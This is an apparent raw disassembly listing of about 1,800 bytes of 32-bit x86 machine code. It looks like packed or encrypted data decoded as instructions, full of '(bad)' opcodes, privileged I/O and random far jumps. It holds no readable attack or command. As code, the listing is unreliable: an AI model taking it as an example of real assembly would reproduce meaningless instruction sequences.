  40d416:	mov    ebp,0x113c7b08
  40d41b:	ins    DWORD PTR es:[di],dx
  40d41d:	aad    0x85
  40d41f:	mov    dl,0xc6
  40d421:	adc    esi,DWORD PTR [edx]
  40d423:	xlat   BYTE PTR ds:[ebx]
  40d424:	stos   DWORD PTR es:[edi],eax
  40d425:	push   esp
  40d426:	xchg   ebx,eax
  40d427:	dec    esp
  40d428:	or     ebx,eax
  40d42a:	shr    esi,0xd
  40d42d:	xchg   DWORD PTR [eax+edi*2],ecx
  40d430:	xchg   ebx,edi
  40d432:	xchg   DWORD PTR cs:[edx+0x559be867],edi
  40d439:	call   0xea15:0x1715d112
  40d440:	and    esi,esp
  40d442:	fadd   DWORD PTR [esi+0x21]
  40d445:	cmp    al,0xf3
  40d447:	(bad)  
  40d448:	stos   DWORD PTR es:[edi],eax
  40d449:	mov    edx,0x7c915d89
  40d44e:	clc    
  40d44f:	inc    edi
  40d450:	lea    edx,[eax]
  40d452:	imul   edx,DWORD PTR ds:0x59361aa1,0xffffffaa
  40d459:	mov    dh,cl
  40d45b:	push   es
  40d45c:	mov    eax,DWORD PTR [ebx-0xd]
  40d45f:	push   edx
  40d460:	loop   0x40d3e3
  40d462:	jno    0x40d46b
  40d464:	inc    edx
  40d465:	pop    ds
  40d466:	sbb    BYTE PTR [edx-0x62],dl
  40d469:	popa   
  40d46a:	mov    eax,0x657fda1c
  40d46f:	mov    cl,0x42
  40d471:	or     eax,0x83fb5090
  40d476:	lods   al,BYTE PTR ds:[esi]
  40d477:	repnz sahf 
  40d479:	cmp    BYTE PTR [ebp+eax*2-0x29],0x79
  40d47e:	fisubr DWORD PTR [ebx-0x1b3c274e]
  40d484:	imul   ebp,DWORD PTR [eax+0x37],0xffffff9e
  40d488:	outs   dx,BYTE PTR ds:[esi]
  40d48a:	inc    eax
  40d48b:	jae    0x40d417
  40d48d:	fisubr DWORD PTR [edx]
  40d48f:	xchg   edi,eax
  40d490:	inc    edx
  40d491:	and    ebp,DWORD PTR [edi-0x38786adf]
  40d497:	out    0x48,al
  40d499:	mov    dl,0x60
  40d49b:	push   edx
  40d49c:	mov    al,ds:0x7fda32e7
  40d4a1:	mov    esp,0x24f10a9e
  40d4a6:	or     BYTE PTR [ebp-0x1cd9505d],ah
  40d4ac:	pushf  
  40d4ad:	shr    DWORD PTR [esi],1
  40d4af:	adc    al,0x9f
  40d4b1:	mov    cl,0xda
  40d4b3:	jb     0x40d45a
  40d4b5:	mov    edx,0xe24a6ba3
  40d4ba:	scas   eax,DWORD PTR es:[edi]
  40d4bb:	out    0x9,al
  40d4bd:	mov    dl,0x25
  40d4bf:	aaa    
  40d4c0:	stos   BYTE PTR es:[edi],al
  40d4c1:	or     eax,DWORD PTR [ebp-0x4d]
  40d4c4:	enter  0xc8fa,0x54
  40d4c8:	(bad)  
  40d4c9:	adc    al,0x6c
  40d4cb:	mov    bl,0xf4
  40d4cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4ce:	adc    eax,0x9dfe41b2
  40d4d3:	pop    ds
  40d4d4:	xor    al,0xd4
  40d4d6:	sub    al,0x3c
  40d4d8:	cmp    ecx,0x8e0fe2c4
  40d4de:	xchg   esp,eax
  40d4df:	fidivr DWORD PTR [ebp+0x3a]
  40d4e2:	mov    DWORD PTR [ebp+0x7d],edx
  40d4e5:	add    eax,0x1bb7cc2
  40d4ea:	lods   al,BYTE PTR ds:[esi]
  40d4eb:	xchg   ecx,eax
  40d4ec:	leave  
  40d4ed:	lahf   
  40d4ee:	mov    DWORD PTR [ecx],eax
  40d4f0:	mov    ebx,0xbc816205
  40d4f5:	cmp    edi,DWORD PTR [esi-0x68d4cb98]
  40d4fb:	lods   eax,DWORD PTR ds:[esi]
  40d4fc:	jg     0x40d506
  40d4fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d500:	xor    eax,0xacb8174a
  40d505:	jns    0x40d4d4
  40d507:	out    0x99,al
  40d509:	or     eax,0x98d09024
  40d50e:	push   edx
  40d50f:	bound  ebx,QWORD PTR [esi+0x3c]
  40d512:	lods   eax,DWORD PTR ds:[esi]
  40d513:	xchg   esi,eax
  40d514:	xor    BYTE PTR [ebx+0x6e048c63],0xf7
  40d51b:	mov    edi,0x5708a052
  40d520:	retf   0xc1a8
  40d523:	mov    esi,0x2d305e99
  40d528:	mov    dl,0xf
  40d52a:	in     al,0xb6
  40d52c:	fs push eax
  40d52e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d52f:	add    eax,DWORD PTR [ecx+0x6711078f]
  40d535:	dec    edi
  40d536:	repnz icebp 
  40d538:	xor    al,0x73
  40d53a:	repnz lds ebp,FWORD PTR ss:[esi+0x59]
  40d53f:	push   ecx
  40d540:	push   ebx
  40d541:	div    esi
  40d543:	xor    BYTE PTR ds:0xfca72441,cl
  40d549:	or     ebx,DWORD PTR [edi+0xe]
  40d54c:	je     0x40d591
  40d54e:	mov    esp,0xfb0dc1dc
  40d553:	jmp    0x31cebc81
  40d558:	ja     0x40d4fe
  40d55a:	and    BYTE PTR [ebx+ecx*1],ah
  40d55d:	push   0x7c
  40d55f:	push   ecx
  40d560:	adc    al,0x44
  40d562:	sbb    BYTE PTR fs:0x733498a2,dh
  40d569:	shl    DWORD PTR [edx-0x4f228d24],0xc1
  40d570:	std    
  40d571:	aam    0x7e
  40d573:	xchg   DWORD PTR [edi],esp
  40d575:	and    BYTE PTR [eax],al
  40d577:	cwde   
  40d578:	hlt    
  40d579:	pusha  
  40d57a:	adc    ecx,DWORD PTR [edi+0x65]
  40d57d:	(bad)  
  40d57e:	jge    0x40d536
  40d580:	aam    0x13
  40d582:	pop    edi
  40d583:	jb     0x40d5ae
  40d585:	push   eax
  40d586:	daa    
  40d587:	sbb    eax,DWORD PTR [eax-0x482b0074]
  40d58d:	loope  0x40d581
  40d58f:	jmp    0x6c6fa757
  40d594:	call   DWORD PTR [esi+ebx*1-0x3f]
  40d598:	jmp    0xf4d9:0x6e2d64a6
  40d59f:	or     eax,0xf6f1f2ff
  40d5a4:	xor    BYTE PTR [ebx],ah
  40d5a6:	sub    DWORD PTR [edi+eiz*2-0x4e],0x32
  40d5ab:	gs test al,0x36
  40d5ae:	stc    
  40d5af:	adc    esi,DWORD PTR [ebx-0x500a2557]
  40d5b5:	ret    0x7987
  40d5b8:	std    
  40d5b9:	adc    edx,DWORD PTR [esi]
  40d5bb:	rcl    DWORD PTR [ecx-0x3e75ceda],1
  40d5c1:	fisttp QWORD PTR [ecx-0x20]
  40d5c4:	jmp    0x40d5e1
  40d5c6:	lods   al,BYTE PTR ds:[esi]
  40d5c7:	test   BYTE PTR [edi-0x7b],dl
  40d5ca:	fwait
  40d5cb:	inc    esp
  40d5cc:	and    esp,esp
  40d5ce:	push   ebp
  40d5cf:	xchg   edi,eax
  40d5d0:	sar    ebx,1
  40d5d2:	repz add dh,BYTE PTR [edx]
  40d5d5:	sar    DWORD PTR [eax-0x45],cl
  40d5d8:	sub    ah,BYTE PTR [esi-0x39]
  40d5db:	mov    ds:0xe21977b4,eax
  40d5e0:	cdq    
  40d5e1:	in     al,dx
  40d5e2:	push   0x6c
  40d5e4:	xor    DWORD PTR [ebx+0x73cff2e5],0x666cf47e
  40d5ee:	xor    BYTE PTR [esi+ebp*2],cl
  40d5f1:	xor    al,0xa4
  40d5f3:	push   cs
  40d5f4:	repnz add ah,BYTE PTR [ebx+0x78]
  40d5f8:	sub    BYTE PTR [edi-0x110db651],ch
  40d5fe:	loop   0x40d620
  40d600:	mov    ecx,0x734f767a
  40d605:	out    dx,eax
  40d606:	fcmovbe st,st(2)
  40d608:	test   al,0x11
  40d60a:	ins    DWORD PTR es:[edi],dx
  40d60b:	cmc    
  40d60c:	sbb    edx,DWORD PTR [edx]
  40d60e:	jge    0x40d685
  40d610:	aad    0x8e
  40d612:	scas   al,BYTE PTR es:[edi]
  40d613:	mov    DWORD PTR [ebx-0x5aa6e3da],0xce8590df
  40d61d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d61e:	pusha  
  40d61f:	(bad)  
  40d620:	sti    
  40d621:	dec    eax
  40d622:	push   esi
  40d623:	add    BYTE PTR [ebx-0x40],0x46
  40d627:	stos   WORD PTR es:[edi],ax
  40d629:	enter  0x4c04,0xc0
  40d62d:	cmc    
  40d62e:	in     eax,dx
  40d62f:	sbb    al,0xd5
  40d631:	jbe    0x40d682
  40d633:	pop    es
  40d634:	xor    dl,BYTE PTR gs:[ecx+0x4]
  40d638:	mov    eax,0x51ca0ef7
  40d63d:	push   edx
  40d63e:	lock out dx,eax
  40d640:	pop    ebp
  40d641:	cwde   
  40d642:	out    dx,eax
  40d643:	jne    0x40d649
  40d645:	in     al,0x84
  40d647:	sbb    DWORD PTR [esi+0x51],ecx
  40d64a:	mov    WORD PTR [edi-0xc],es
  40d64d:	and    al,ch
  40d64f:	push   ss
  40d650:	and    ah,cl
  40d652:	add    eax,0xa802a9f8
  40d657:	adc    edx,DWORD PTR [ecx+0x31]
  40d65a:	add    DWORD PTR [edx],edx
  40d65c:	xchg   ebx,eax
  40d65d:	ds pop edx
  40d65f:	sahf   
  40d660:	sbb    DWORD PTR [ecx-0x4e],0xe417fe76
  40d667:	inc    ecx
  40d668:	loop   0x40d633
  40d66a:	and    eax,0xce66dd33
  40d66f:	push   ss
  40d670:	and    dh,bh
  40d672:	adc    BYTE PTR [ebx+0x1f],ch
  40d675:	mov    ecx,0xa179b467
  40d67a:	and    BYTE PTR [ebx+0x13974892],bl
  40d680:	cwde   
  40d681:	aas    
  40d682:	jmp    0x2b875790
  40d687:	adc    eax,0x4894550d
  40d68c:	xor    edi,DWORD PTR [esi-0x2d]
  40d68f:	or     eax,0x28b3e2d2
  40d694:	les    esp,FWORD PTR [ebx+eax*2-0x342555e]
  40d69b:	fldln2 
  40d69d:	pop    es
  40d69e:	mov    gs,eax
  40d6a0:	mov    DWORD PTR [esi],ecx
  40d6a2:	xor    BYTE PTR es:[edx-0x50f34665],ah
  40d6a9:	push   esp
  40d6aa:	popa   
  40d6ab:	sub    edi,edx
  40d6ad:	loopne 0x40d67d
  40d6af:	inc    esi
  40d6b0:	aad    0xc8
  40d6b2:	lds    esi,FWORD PTR [eax]
  40d6b4:	popf   
  40d6b5:	adc    BYTE PTR [edx+0x6671303d],ah
  40d6bb:	mov    cl,0xd
  40d6bd:	xor    eax,0xa16554d
  40d6c2:	inc    esp
  40d6c3:	dec    edi
  40d6c4:	xchg   ebp,eax
  40d6c5:	scas   eax,DWORD PTR es:[edi]
  40d6c6:	ja     0x40d6c4
  40d6c8:	sbb    eax,0xa2700215
  40d6cd:	inc    edx
  40d6ce:	add    al,0x1d
  40d6d0:	ins    DWORD PTR es:[edi],dx
  40d6d1:	jno    0x40d69c
  40d6d3:	mov    dl,0x18
  40d6d5:	dec    ebx
  40d6d6:	dec    eax
  40d6d7:	add    eax,DWORD PTR [esi]
  40d6d9:	daa    
  40d6da:	icebp  
  40d6db:	adc    edx,ebp
  40d6dd:	add    al,0xde
  40d6df:	loope  0x40d731
  40d6e1:	inc    ebp
  40d6e2:	xchg   esi,eax
  40d6e3:	repnz dec esp
  40d6e5:	pop    ds
  40d6e6:	fistp  QWORD PTR [esi+ebx*8]
  40d6e9:	sbb    BYTE PTR [ecx-0x12a287e4],0x41
  40d6f0:	stos   DWORD PTR es:[edi],eax
  40d6f1:	add    esp,esi
  40d6f3:	jb     0x40d749
  40d6f5:	push   ecx
  40d6f6:	lods   al,BYTE PTR ds:[esi]
  40d6f7:	inc    ecx
  40d6f8:	xlat   BYTE PTR ds:[ebx]
  40d6f9:	or     DWORD PTR ds:0xdcaa819,eax
  40d6ff:	pop    edi
  40d700:	pop    esp
  40d701:	xchg   esi,eax
  40d702:	dec    BYTE PTR [eax+0x4e]
  40d705:	mov    ds:0x423b9034,al
  40d70a:	fisttp WORD PTR [ebx+0x30bc7741]
  40d710:	dec    ebx
  40d711:	loope  0x40d69d
  40d713:	pusha  
  40d714:	repnz fdivr DWORD PTR [edi+0x2a6bcc7f]
  40d71b:	ins    DWORD PTR es:[edi],dx
  40d71c:	mov    al,0x4
  40d71e:	in     al,dx
  40d71f:	sahf   
  40d720:	fsubr  QWORD PTR [eax]
  40d722:	xchg   ebp,eax
  40d723:	sub    eax,0x39b9129f
  40d728:	int3   
  40d729:	jge    0x40d72c
  40d72b:	mov    esp,0x5d3b24ea
  40d730:	xchg   edi,eax
  40d731:	sub    BYTE PTR [ebx+0x1c],cl
  40d734:	push   edi
  40d735:	scas   al,BYTE PTR es:[edi]
  40d736:	cmp    esp,DWORD PTR [eax+0x6b54f310]
  40d73c:	sti    
  40d73d:	lds    edi,FWORD PTR [ecx+0x5a]
  40d740:	pop    eax
  40d741:	fimul  WORD PTR [edi-0x3b0d0ec9]
  40d747:	lahf   
  40d748:	popa   
  40d749:	lahf   
  40d74a:	sar    ecx,0xb1
  40d74d:	pusha  
  40d74e:	dec    edi
  40d74f:	cld    
  40d750:	jmp    0x937c:0x558c0f26
  40d757:	cmp    DWORD PTR [ebp-0x125cf3fa],ecx
  40d75d:	mov    ch,BYTE PTR [ecx+ebx*8+0xc]
  40d761:	and    dh,BYTE PTR [ebp-0x34de79c8]
  40d767:	ds scas eax,DWORD PTR es:[edi]
  40d769:	test   eax,0x8419c202
  40d76e:	fadd   DWORD PTR [edi]
  40d770:	mov    edx,0x357ce27f
  40d775:	ret    0x3de
  40d778:	ficomp WORD PTR [eax]
  40d77a:	test   eax,0x63fcc3f9
  40d77f:	clc    
  40d780:	and    bl,BYTE PTR [eax+0x2]
  40d783:	enter  0x899a,0x67
  40d787:	int3   
  40d788:	repnz mov ebp,0xf08bb580
  40d78e:	dec    edx
  40d78f:	test   al,0xb7
  40d791:	xchg   ebx,eax
  40d792:	pop    ds
  40d793:	jmp    0x37cb6221
  40d798:	in     eax,0x6
  40d79a:	inc    ebx
  40d79b:	pop    es
  40d79c:	xchg   ecx,eax
  40d79d:	pop    edx
  40d79e:	mov    al,ds:0x305a2f5d
  40d7a3:	inc    ebp
  40d7a4:	sbb    eax,0xfa275c4a
  40d7a9:	ins    BYTE PTR es:[edi],dx
  40d7aa:	rcr    BYTE PTR [edi],1
  40d7ac:	add    eax,0xeab6f084
  40d7b1:	daa    
  40d7b2:	add    eax,0xe5bcd7f6
  40d7b7:	pop    ds
  40d7b8:	lahf   
  40d7b9:	push   edi
  40d7ba:	ror    DWORD PTR [eax],0xb0
  40d7bd:	into   
  40d7be:	adc    eax,0x193076a4
  40d7c3:	fistp  DWORD PTR [eax]
  40d7c5:	sbb    DWORD PTR [esp+ecx*4-0x35],esi
  40d7c9:	dec    ebp
  40d7ca:	adc    BYTE PTR [esp+ebx*8+0x5f5e9bf9],al
  40d7d1:	push   eax
  40d7d2:	call   0xf256dbaa
  40d7d7:	pop    ss
  40d7d8:	shl    BYTE PTR [esp+ebx*2],0x39
  40d7dc:	test   al,0x78
  40d7de:	jae    0x40d7ed
  40d7e0:	and    ecx,edx
  40d7e2:	movntq QWORD PTR [edx-0x69],mm5
  40d7e6:	lods   eax,DWORD PTR ds:[esi]
  40d7e7:	cwde   
  40d7e8:	fadd   QWORD PTR [eax+esi*2+0x3ab2e7b0]
  40d7ef:	mov    ch,0x35
  40d7f1:	adc    cl,BYTE PTR [ecx]
  40d7f3:	les    ebp,FWORD PTR [eax]
  40d7f5:	and    al,0xfd
  40d7f7:	mov    esi,0xe03e6bb6
  40d7fc:	fsub   st(4),st
  40d7fe:	out    0x66,al
  40d800:	jmp    0x262add9e
  40d805:	mov    al,ds:0x81c16a7
  40d80a:	sbb    esi,DWORD PTR [eax-0x65]
  40d80d:	std    
  40d80e:	sti    
  40d80f:	mov    bh,0xb3
  40d811:	lods   al,BYTE PTR ds:[esi]
  40d812:	push   esp
  40d813:	es sahf 
  40d815:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d816:	mov    BYTE PTR [esi-0x67],bh
  40d819:	xchg   DWORD PTR [esi+0x3a47fabb],esi
  40d81f:	pop    ebp
  40d820:	xor    cl,BYTE PTR [edi+0x7b]
  40d823:	fsincos 
  40d825:	or     al,0xa1
  40d827:	cmp    eax,0xec3a7bd1
  40d82c:	stos   DWORD PTR es:[edi],eax
  40d82d:	push   0x8853c636
  40d832:	mov    edx,?
  40d834:	mov    cl,0x15
  40d836:	sub    al,0x7f
  40d838:	in     al,dx
  40d839:	fucomip st,st(5)
  40d83b:	xor    al,0x9b
  40d83d:	xlat   BYTE PTR ds:[ebx]
  40d83e:	pop    ecx
  40d83f:	js     0x40d880
  40d841:	adc    BYTE PTR [ecx-0x56],0xb1
  40d845:	sub    eax,0x174ffb21
  40d84a:	pop    ds
  40d84b:	xchg   ecx,eax
  40d84c:	push   ebp
  40d84d:	sub    bl,BYTE PTR [eax+0x68]
  40d850:	sub    BYTE PTR [ebx+0x50d5a2c6],ah
  40d856:	icebp  
  40d857:	adc    al,0xc9
  40d859:	or     ch,dl
  40d85b:	mov    al,0xb1
  40d85d:	xor    BYTE PTR [ecx+0xb897dc7],ch
  40d863:	into   
  40d864:	(bad)  
  40d865:	loopne 0x40d820
  40d867:	cli    
  40d868:	xlat   BYTE PTR ds:[ebx]
  40d869:	cmc    
  40d86a:	in     al,dx
  40d86b:	dec    edx
  40d86c:	push   esp
  40d86d:	sub    edi,DWORD PTR [edi-0x6d]
  40d870:	test   al,0x45
  40d872:	imul   BYTE PTR [eax-0x7d4aa1b2]
  40d878:	mov    dl,0xac
  40d87a:	(bad)  
  40d87b:	cmp    al,0x46
  40d87d:	dec    ecx
  40d87e:	xor    bh,dh
  40d880:	in     eax,dx
  40d881:	(bad)  
  40d883:	test   BYTE PTR [eax],ch
  40d885:	xor    esp,esi
  40d887:	add    BYTE PTR [esp+ebx*1-0x3],ah
  40d88b:	mov    ah,0xc6
  40d88d:	cmp    al,0xf1
  40d88f:	(bad)  
  40d890:	and    bl,BYTE PTR [edx+0x45991035]
  40d896:	cmp    eax,0xe88f8b18
  40d89b:	scas   eax,DWORD PTR es:[edi]
  40d89c:	arpl   WORD PTR [eax-0x5e],di
  40d89f:	dec    ebp
  40d8a0:	mov    ebx,esp
  40d8a2:	dec    esp
  40d8a3:	lods   eax,DWORD PTR ds:[esi]
  40d8a4:	xchg   DWORD PTR [ebx],edx
  40d8a6:	adc    eax,esi
  40d8a8:	sti    
  40d8a9:	adc    BYTE PTR [ecx],al
  40d8ab:	sub    cl,BYTE PTR [esi+0x60ae1aa]
  40d8b1:	aaa    
  40d8b2:	loope  0x40d856
  40d8b4:	xchg   DWORD PTR [esi],ebp
  40d8b6:	push   ss
  40d8b7:	loopne 0x40d8d9
  40d8b9:	fimul  WORD PTR [edx+0x15575674]
  40d8bf:	jb     0x40d928
  40d8c1:	push   cs
  40d8c2:	adc    BYTE PTR [edx+0x7f],ah
  40d8c5:	sbb    BYTE PTR [ebx+0x57],al
  40d8c8:	dec    ecx
  40d8c9:	cdq    
  40d8ca:	jno    0x40d85e
  40d8cc:	test   eax,0x7bf52
  40d8d1:	add    al,0xa5
  40d8d3:	xlat   BYTE PTR ds:[ebx]
  40d8d4:	in     al,0xfc
  40d8d6:	aad    0xbf
  40d8d8:	sbb    eax,0x8e9eab9e
  40d8dd:	pop    ecx
  40d8de:	dec    ecx
  40d8df:	sbb    al,0xe9
  40d8e1:	xchg   esi,eax
  40d8e2:	dec    ebx
  40d8e3:	pop    ecx
  40d8e4:	sbb    eax,0x823731e9
  40d8e9:	daa    
  40d8ea:	movq   mm7,mm0
  40d8ed:	sbb    ebx,DWORD PTR [edx-0x5a]
  40d8f0:	xchg   edi,eax
  40d8f1:	cmp    eax,0xd56d0a4d
  40d8f6:	inc    ebp
  40d8f7:	popf   
  40d8f8:	mov    esp,0x1dcceff2
  40d8fd:	pop    edi
  40d8fe:	xor    BYTE PTR [edx-0x68],ch
  40d901:	mov    edx,0x5e4b68f7
  40d906:	retf   
  40d907:	je     0x40d97a
  40d909:	or     DWORD PTR [ecx+ebx*1],edx
  40d90c:	mov    dl,0x14
  40d90e:	and    bl,BYTE PTR [edi+ebx*1]
  40d911:	and    bl,al
  40d913:	cmovno edx,DWORD PTR [ebx-0x5e]
  40d917:	pushf  
  40d918:	mov    ecx,0x61db93ac
  40d91d:	push   0x672a4690
  40d922:	jecxz  0x40d979
  40d924:	mov    al,ds:0x3f0fca44
  40d929:	mov    esi,0x8506d226
  40d92e:	push   ss
  40d92f:	cmp    al,BYTE PTR [ebx+0x4efc50f5]
  40d935:	shl    BYTE PTR [edi+0x181559f3],1
  40d93b:	xchg   ecx,eax
  40d93c:	test   eax,0x4b728338
  40d941:	ss pop edi
  40d943:	nop
  40d944:	les    ebp,FWORD PTR [ebx+0x354e2c5d]
  40d94a:	test   cl,dh
  40d94c:	xor    al,0x56
  40d94e:	push   esi
  40d94f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d950:	ficomp WORD PTR [ebp+0x1f058a61]
  40d956:	jmp    0x4e53:0xbfd62ba
  40d95d:	jns    0x40d9a5
  40d95f:	inc    esp
  40d960:	daa    
  40d961:	inc    esi
  40d962:	cli    
  40d963:	into   
  40d964:	fbld   TBYTE PTR [ecx-0x4828f2e3]
  40d96a:	dec    ebx
  40d96b:	and    DWORD PTR ds:0xe55a70c2,edx
  40d971:	test   ch,bh
  40d973:	mov    eax,0x7b821e7d
  40d978:	rcr    DWORD PTR ds:0xf92db77f,cl
  40d97e:	mov    esp,0x2c68829d
  40d983:	enter  0xad68,0xb4
  40d987:	je     0x40d999
  40d989:	retf   
  40d98a:	sbb    eax,0xdedecfb1
  40d98f:	aad    0xec
  40d991:	sbb    ecx,DWORD PTR [esi-0x77]
  40d994:	cmp    eax,0xad4af790
  40d999:	or     al,0x21
  40d99b:	fnstsw WORD PTR [ebp+0x18f383bb]
  40d9a1:	mov    eax,DWORD PTR [eax-0x4e585857]
  40d9a7:	pop    ds
  40d9a8:	cmp    DWORD PTR [edx+0x58],edx
  40d9ab:	int3   
  40d9ac:	cmp    eax,0xa5317dcc
  40d9b1:	sub    al,0xed
  40d9b3:	xchg   ecx,eax
  40d9b4:	fldcw  WORD PTR [esi-0x1712c39a]
  40d9ba:	cmp    eax,0xb3eeb79e
  40d9bf:	out    dx,eax
  40d9c0:	jle    0x40d9b3
  40d9c2:	arpl   di,sp
  40d9c4:	out    0x1c,al
  40d9c6:	ffree  st(4)
  40d9c8:	inc    ebx
  40d9c9:	inc    edi
  40d9ca:	fstp   QWORD PTR [edx]
  40d9cc:	mov    ebp,0x3857181f
  40d9d1:	popf   
  40d9d2:	mov    ebx,DWORD PTR [ebp+0x33]
  40d9d5:	(bad)  
  40d9d6:	jle    0x40d9aa
  40d9d8:	repnz das 
  40d9da:	stos   BYTE PTR es:[edi],al
  40d9db:	pop    ss
  40d9dc:	mov    ch,BYTE PTR [eax]
  40d9de:	push   edi
  40d9df:	sti    
  40d9e0:	adc    eax,0x1bf8b83e
  40d9e5:	shl    BYTE PTR [ebx+0x0],0xb0
  40d9e9:	dec    ebp
  40d9ea:	out    0x3f,eax
  40d9ec:	dec    ebx
  40d9ed:	adc    bh,BYTE PTR [edi+0x65]
  40d9f0:	rol    al,1
  40d9f2:	fcom   st(1)
  40d9f4:	pop    eax
  40d9f5:	shr    esp,cl
  40d9f7:	mov    ah,0x75
  40d9f9:	je     0x40da0d
  40d9fb:	xor    bl,BYTE PTR [edi-0x1736ecdd]
  40da01:	xor    DWORD PTR [eax-0x3],edi
  40da04:	mov    eax,0xf5f6600a
  40da09:	push   0xfffffff1
  40da0b:	dec    ecx
  40da0c:	mov    cl,0x49
  40da0e:	scas   eax,DWORD PTR es:[edi]
  40da0f:	or     ah,cl
  40da11:	lods   eax,DWORD PTR ds:[esi]
  40da12:	enter  0xb821,0x14
  40da16:	mov    al,0x54
  40da18:	mov    edx,DWORD PTR [edx-0x63]
  40da1b:	(bad)  
  40da1c:	xchg   edx,eax
  40da1d:	rol    BYTE PTR [edx-0x52a864a8],cl
  40da23:	les    ebp,FWORD PTR [ecx+0x6df78a7f]
  40da29:	and    edx,DWORD PTR es:[esi]
  40da2c:	push   eax
  40da2d:	cdq    
  40da2e:	int    0xbe
  40da30:	fild   WORD PTR [edi-0x3185b64d]
  40da36:	mov    ch,ah
  40da38:	mov    ds,WORD PTR [ebp+0xd]
  40da3b:	lods   al,BYTE PTR ds:[esi]
  40da3c:	mov    dl,0x4
  40da3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da3f:	pop    esp
  40da40:	cwde   
  40da41:	jge    0x40da2b
  40da43:	xchg   ebp,eax
  40da44:	icebp  
  40da45:	add    BYTE PTR [esi+0x27],ch
  40da48:	adc    eax,DWORD PTR [eax+edi*8+0x7f]
  40da4c:	pop    ebx
  40da4d:	fsubr  DWORD PTR [edx+0x68]
  40da50:	push   edx
  40da51:	(bad)  
  40da52:	pushf  
  40da53:	test   eax,0x3e8ec1d0
  40da58:	sbb    al,0x64
  40da5a:	xor    ah,BYTE PTR [edi+0x29a732d6]
  40da60:	add    BYTE PTR [ebp-0x24],cl
  40da63:	ins    DWORD PTR es:[edi],dx
  40da64:	je     0x40da0a
  40da66:	xchg   ebx,eax
  40da67:	retf   
  40da68:	and    edi,DWORD PTR [ebx-0x2f]
  40da6b:	mov    esi,DWORD PTR [edi]
  40da6d:	push   edi
  40da6e:	rcr    BYTE PTR [ebp+0x27ffe3c1],1
  40da74:	mov    edi,0x18060787
  40da79:	sbb    BYTE PTR [edi+0x51603735],0x46
  40da80:	ret    
  40da81:	mov    esi,0x4bed2402
  40da86:	adc    al,0xe
  40da88:	inc    BYTE PTR [ecx+0xe366eeb]
  40da8e:	mov    ebx,0x6d55355b
  40da93:	xor    ah,BYTE PTR [eax]
  40da95:	xchg   edi,eax
  40da96:	popf   
  40da97:	stos   BYTE PTR es:[edi],al
  40da98:	rcl    ebp,cl
  40da9a:	jbe    0x40da47
  40da9c:	and    BYTE PTR [esi],bl
  40da9e:	push   ss
  40da9f:	retf   
  40daa0:	pop    edx
  40daa1:	jne    0x40dae4
  40daa3:	mov    dh,0x0
  40daa5:	cmp    esi,ecx
  40daa7:	ins    BYTE PTR es:[edi],dx
  40daa8:	and    ebx,DWORD PTR [edi]
  40daaa:	lock loopne 0x40da7b
  40daad:	call   0xae1c3f7d
  40dab2:	pop    es
  40dab3:	rcl    BYTE PTR [ecx-0x29237492],cl
  40dab9:	psrlw  mm6,QWORD PTR [edx+ebx*1+0x1c]
  40dabe:	cmp    BYTE PTR fs:[edx+0x2a],ah
  40dac2:	inc    ebx
  40dac3:	cwde   
  40dac4:	popa   
  40dac5:	outs   dx,BYTE PTR ds:[esi]
  40dac6:	mov    esi,0x2835f92d
  40dacb:	shl    BYTE PTR [eax],0xa5
  40dace:	shl    DWORD PTR [ebp+0x4b],cl
  40dad1:	jne    0x40daf9
  40dad3:	imul   edx,DWORD PTR [eax+0x63e3cf6f],0xffffffac
  40dada:	adc    al,0x4d
  40dadc:	mov    al,ds:0x1190c6bc
  40dae1:	rcl    BYTE PTR [ebx+0x3f02b7d5],cl
  40dae7:	cmp    al,0xaf
  40dae9:	in     eax,0x65
  40daeb:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40daed:	jmp    0xdbd:0x44d2ea2c
  40daf4:	gs ss jne 0x40db3a
  40daf8:	data16 int 0xbf
  40dafb:	sbb    cl,BYTE PTR [eax+eiz*4+0x951be08]
  40db02:	test   al,0x6b
  40db04:	cmp    al,0x4d
  40db06:	js     0x40da92
  40db08:	and    DWORD PTR [ebp+0x74b5c5e0],0xffffffb4
  40db0f:	add    eax,0x589d0ab6
  40db14:	inc    esi
  40db15:	cld    
  40db16:	or     ebp,DWORD PTR [ebp+0x55]
  40db19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db1a:	jle    0x40daec
  40db1c:	aas    
  40db1d:	lahf   
  40db1e:	cmc    
  40db1f:	mov    ecx,0x8f7567f1
  40db24:	mov    bh,0x83
  40db26:	aam    0x56
  40db28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db29:	mov    bh,0x6
  40db2b:	push   edi
  40db2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db2d:	sbb    al,0x4b
  40db2f:	ins    DWORD PTR es:[edi],dx
  40db30:	(bad)  
  40db31:	sub    eax,esp
  40db33:	and    eax,0xc0cbf1b9
  40db38:	mov    BYTE PTR [edi],dh
  40db3a:	cmp    DWORD PTR [ecx-0x69],ecx
  40db3d:	push   0xffffffa8
  40db3f:	pop    ebx
  40db40:	ret    0xb9d0
  40db43:	mov    ebp,0xd7052b02
  40db48:	loop   0x40db1c
  40db4a:	not    BYTE PTR [edx+0x54555096]
  40db50:	add    edx,DWORD PTR [edi+0x6c]
  40db53:	outs   dx,DWORD PTR ds:[esi]
  40db55:	pop    ebx
  40db56:	dec    edx
  40db57:	test   ebp,0x1ac6ce1e
  40db5d:	in     eax,dx
  40db5e:	aaa    
  40db5f:	push   edx
  40db60:	cwde   
  40db61:	out    dx,eax
  40db62:	cwde   
  40db63:	cli    
  40db64:	dec    esp
  40db65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db66:	dec    edx
  40db67:	mov    edx,0x6fc38455
  40db6c:	sub    DWORD PTR [ecx-0x19],ebp
  40db6f:	mov    BYTE PTR [esi+0x29a9396a],dl
  40db75:	loop   0x40db62
  40db77:	lea    ebx,[edi+0x1c]
  40db7a:	aad    0xd6
  40db7c:	jnp    0x40db6c
  40db7e:	aam    0x44
